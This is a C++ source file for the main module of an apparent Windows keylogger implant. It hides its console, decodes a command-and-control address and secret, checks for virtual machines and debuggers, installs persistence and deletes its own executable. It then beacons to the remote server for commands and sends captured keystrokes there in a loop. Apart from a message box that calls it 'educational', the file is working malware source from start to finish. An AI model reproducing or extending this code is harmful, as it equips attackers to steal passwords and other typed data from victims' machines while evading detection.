#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <iomanip>
#include <fstream>
#include <iostream>
#include <ctime>
#include <random>
#include <tlhelp32.h>

#include "config.hpp"
#include "keylogger.h"
#include "utils.h"
#include "persistence.h"
#include "anti_vm.h"
#include "anti_debug.h"
#include "network.h"
#include "globals.h"
#include "obfuscated_strings.h"

using namespace std; 

// Global variables (definitions)
string client_id;
string c2_server;
int c2_port = 5000;
string shared_secret;
string user_agent; // Definition for the deobfuscated user agent string
char encryption_key = 0x42;
string key_buffer;
bool registered = false;
int exfiltration_retry_count = 3;
mt19937 rng(chrono::steady_clock::now().time_since_epoch().count());

// Debug and anti-VM/anti-debugging flags
bool g_debug_mode = true;              // When true, shows console and prints debug info
bool g_exit_on_vm = false;             // When true, exits if VM is detected
bool g_exit_on_debugger = false;       // When true, exits if debugger is detected

// Enhanced XOR encoding with key rotation
string xor_encode_with_rotation(const string& data, char& key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

string xor_decode_with_rotation(const string& data, char key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

string get_timestamp() {
    auto now = chrono::system_clock::now();
    auto time_t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

void print_debug(const string& message) {
    if (g_debug_mode) {
        cout << message << endl;
        cout.flush();
    }
}

void exfiltration_worker() {    
    if (g_debug_mode) {
        cout << "Exfiltration worker starting with buffer size: " << key_buffer.size() << endl;
        cout.flush();
    }
    
    while (true) {
        int sleep_time = get_random_sleep_interval(10); // Use a shorter interval for testing
        
        if (g_debug_mode) {
            cout << "Exfiltration worker sleeping for " << sleep_time << "ms" << endl;
            cout.flush();
        }
        
        Sleep(sleep_time);
        
        if (g_debug_mode) {
            cout << "Exfiltration worker checking buffer (size: " << key_buffer.size() << ")" << endl;
            cout.flush();
        }
        
        add_junk_instruction();
        
        if (!key_buffer.empty()) {
            if (g_debug_mode) {
                cout << "Key buffer not empty, sending data..." << endl;
                if (key_buffer.length() < 100) {
                    cout << "Buffer content: " << key_buffer << endl;
                } else {
                    cout << "Buffer content (truncated): " << key_buffer.substr(0, 100) << "..." << endl;
                }
                cout.flush();
            }
            
            string data_to_send = key_buffer;
            if (exfiltrate_keylog_data(data_to_send)) {
                key_buffer.clear();
                if (g_debug_mode) {
                    cout << "Exfiltration successful, buffer cleared" << endl;
                    cout.flush();
                }
            } else {
                if (g_debug_mode) {
                    cout << "Exfiltration failed, keeping data for next attempt" << endl;
                    cout.flush();
                }
            }
        } else {
            if (g_debug_mode) {
                cout << "Key buffer empty, nothing to exfiltrate" << endl;
                cout.flush();
            }
        }
        
        add_impossible_disassembly();
    }
}

void execute_command(const string& command) {
    add_junk_instruction(); // Add junk instruction to obfuscate command execution
    
    if (g_debug_mode) {
        cout << "Executing command: '" << command << "'" << endl;
        cout.flush();
    }
    
    if (command.find("slp ") == 0) {
        try {
            int n = stoi(command.substr(4));
            if (g_debug_mode) {
                cout << "Sleeping for " << n << " seconds" << endl;
                cout.flush();
            }
            Sleep(n * 1000);
        } catch (...) {
            if (g_debug_mode) {
                cout << "Invalid sleep time" << endl;
                cout.flush();
            }
        }
    } else if (command == "shd") {
        if (g_debug_mode) {
            cout << "Shutdown command received, exiting..." << endl;
            cout.flush();
        }
        ExitProcess(0);
    } else if (command == "pwn") {
        // Handle the case where pwn has no message
        string message = "Sorry, you've been pwned, for educational purposes!";
        if (g_debug_mode) {
            cout << "Displaying message box: " << message << endl;
            cout.flush();
        }
        wstring wmessage(message.begin(), message.end());
        MessageBoxW(NULL, wmessage.c_str(), L"PWNED!", MB_OK | MB_ICONWARNING);
    } else if (command.find("pwn ") == 0) {
        string message = command.substr(4);
        if (message.empty()) {
            message = "Sorry, you've been pwned, for educational purposes!";
        }
        if (g_debug_mode) {
            cout << "Displaying message box: " << message << endl;
            cout.flush();
        }
        wstring wmessage(message.begin(), message.end());
        MessageBoxW(NULL, wmessage.c_str(), L"PWNED!", MB_OK | MB_ICONWARNING);
    } else if (command == "get_keys") {
        if (g_debug_mode) {
            cout << "Exfiltrating keylog data on demand" << endl;
            cout.flush();
        }
        if (!key_buffer.empty()) {
            exfiltrate_keylog_data(key_buffer);
            key_buffer.clear();
        } else {
            if (g_debug_mode) {
                cout << "No keylog data to exfiltrate" << endl;
                cout.flush();
            }
        }
    } else {
        if (g_debug_mode) {
            cout << "Unknown command: " << command << endl;
            cout.flush();
        }
    }
}

void beacon() {
    while (true) {
        try {
            // Anti-debugging check during runtime
            if (is_debugger_present() && g_exit_on_debugger) {
                ExitProcess(0);
            }
            
            string endpoint = "/command?id=" + client_id;
            string response;

            add_junk_instruction();
            
            if (send_http_request(endpoint, "GET", "", &response)) {
                size_t p = response.find("\"cmd\"");
                if (p != string::npos) {
                    // find the ':' after "cmd"
                    size_t colon = response.find(':', p);
                    // first quote after colon
                    size_t q1 = response.find('"', colon);
                    // second quote
                    size_t q2 = response.find('"', q1 + 1);
                    string command;
                    if (q1 != string::npos && q2 != string::npos && q2 > q1)
                        command = response.substr(q1 + 1, q2 - q1 - 1);

                    if (!command.empty()) {
                        execute_command(command);
                        if (g_debug_mode) {
                            cout << "Received command: '" << command << "'" << endl;
                            cout.flush();
                        }
                    }
                }
            }
        } catch (...) {
            // Continue beaconing
        }
        
        Sleep(get_random_sleep_interval(30)); // Variable beacon interval
    }
}

int main() {
    try {
        // Configure console based on debug mode
        HWND consoleWindow = GetConsoleWindow();
        
        if (g_debug_mode) {
            // Debug mode - ensure console is visible and working
            if (consoleWindow == NULL) {
                AllocConsole();
                consoleWindow = GetConsoleWindow();
            }
            
            if (consoleWindow != NULL) {
                ShowWindow(consoleWindow, SW_SHOW);  // Force show console for debugging
                // Redirect standard streams
                FILE* pCout;
                FILE* pCerr;
                FILE* pCin;
                freopen_s(&pCout, "CONOUT$", "w", stdout);
                freopen_s(&pCerr, "CONOUT$", "w", stderr);
                freopen_s(&pCin, "CONIN$", "r", stdin);
                
                // Make cout use console
                ios::sync_with_stdio(true);
            }
            
            print_debug("=== MALWARE STARTING IN DEBUG MODE ===");
        } else {
            // Production mode - hide console
            if (consoleWindow != NULL) {
                ShowWindow(consoleWindow, SW_HIDE);
            }
        }

        print_debug("About to deobfuscate configuration...");

        try {
            // Reset encryption key for each deobfuscation
            encryption_key = 0x42;
            c2_server = deobfuscate(reinterpret_cast<const unsigned char*>(obf_c2_server));
            print_debug("C2 Server deobfuscated: " + c2_server);
            
            encryption_key = 0x42;
            shared_secret = deobfuscate(reinterpret_cast<const unsigned char*>(obf_secret));
            print_debug("Secret deobfuscated: " + shared_secret);
            
            encryption_key = 0x42;
            user_agent = deobfuscate(reinterpret_cast<const unsigned char*>(obf_useragent));
            print_debug("User Agent deobfuscated: " + user_agent);
        } catch (exception& e) {
            print_debug("ERROR during deobfuscation: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR during deobfuscation");
        }

        print_debug("C2 Server: " + c2_server);
        print_debug("Shared Secret: " + shared_secret);
        print_debug("User Agent: " + user_agent);
        
        // Anti-VM and anti-debugging checks
        print_debug("Running anti-VM and anti-debug checks...");
        
        bool in_vm = false;
        bool debugger_present = false;
        
        try {
            in_vm = is_running_in_vm();
            print_debug("VM check complete");
        } catch (...) {
            print_debug("ERROR in VM detection");
        }
        
        try {
            debugger_present = is_debugger_present();
            print_debug("Debugger check complete");
        } catch (...) {
            print_debug("ERROR in debugger detection");
        }
        
        if (in_vm) {
            print_debug("VM detected!");
            if (g_exit_on_vm) {
                print_debug("Exiting due to VM detection...");
                ExitProcess(0);
            }
        }
        
        if (debugger_present) {
            print_debug("Debugger detected!");
            if (g_exit_on_debugger) {
                print_debug("Exiting due to debugger detection...");
                ExitProcess(0);
            }
        }
        
        if (!in_vm && !debugger_present) {
            print_debug("No VM or debugger detected.");
        }
        
        // Install persistence
        print_debug("Installing persistence...");
        try {
            install_persistence();
            print_debug("Persistence installed.");
        } catch (exception& e) {
            print_debug("ERROR during persistence: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR during persistence");
        }

        // Delete original file to avoid detection
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        string original_path(currentPath);
        print_debug("Current path: " + original_path);
        
        try {
            safely_remove_original_executable(original_path); // Use new function name
            print_debug("Original file deleted");
        } catch (exception& e) {
            print_debug("ERROR during file deletion: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR during file deletion");
        }

        // gen client id
        print_debug("Generating client ID...");
        try {
            client_id = generate_client_id();
            print_debug("Client ID: " + client_id);
        } catch (exception& e) {
            print_debug("ERROR generating client ID: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR generating client ID");
        }

        // Skip this for now
        // add_impossible_disassembly();
        
        // Register with fallback to DGA domains
        print_debug("Attempting registration with C2 server...");
        
        bool registration_success = false;
        for (int i = 0; i < 3; i++) {
            print_debug("Registration attempt " + to_string(i + 1) + "/3...");
            
            try {
                if (register_with_c2(client_id)) {
                    registration_success = true;
                    print_debug("Registration successful.");
                    break;
                } else {
                    print_debug("Registration returned false");
                }
            } catch (exception& e) {
                print_debug("ERROR during registration: " + string(e.what()));
            } catch (...) {
                print_debug("UNKNOWN ERROR during registration");
            }

            print_debug("Registration failed, retrying...");
            
            Sleep(get_random_sleep_interval(5));
        }

        // Try to get system info
        try {
            print_debug("System Info: " + get_system_info());
        } catch (exception& e) {
            print_debug("ERROR getting system info: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR getting system info");
        }
        
        // exit if registration fails
        if (!registration_success) {
            print_debug("Failed to register with C2 server after multiple attempts.");
            
            if (g_debug_mode) {
                print_debug("Press any key to exit...");
                getchar();  // Wait for user input before exiting in debug mode
            }
            return 1;
        }
        
        print_debug("Starting background threads...");
        
        try {
            thread exfil_thread(exfiltration_worker);
            exfil_thread.detach();
            print_debug("Exfiltration thread started");
            
            thread beacon_thread(beacon);
            beacon_thread.detach();
            print_debug("Beacon thread started");
        } catch (exception& e) {
            print_debug("ERROR starting threads: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR starting threads");
        }

        print_debug("Starting keylogger...");

        // Start keylogger (runs message loop and installs hook)
        try {
            start_keylogger();
            print_debug("Keylogger started");
        } catch (exception& e) {
            print_debug("ERROR starting keylogger: " + string(e.what()));
        } catch (...) {
            print_debug("UNKNOWN ERROR starting keylogger");
        }
    } catch (exception& e) {
        if (g_debug_mode) {
            cout << "FATAL ERROR in main: " << e.what() << endl;
            cout.flush();
            getchar();
        }
    } catch (...) {
        if (g_debug_mode) {
            cout << "UNKNOWN FATAL ERROR in main" << endl;
            cout.flush();
            getchar();
        }
    }

    if (g_debug_mode) {
        print_debug("Press any key to exit...");
        getchar();
    }
    return 0;
}
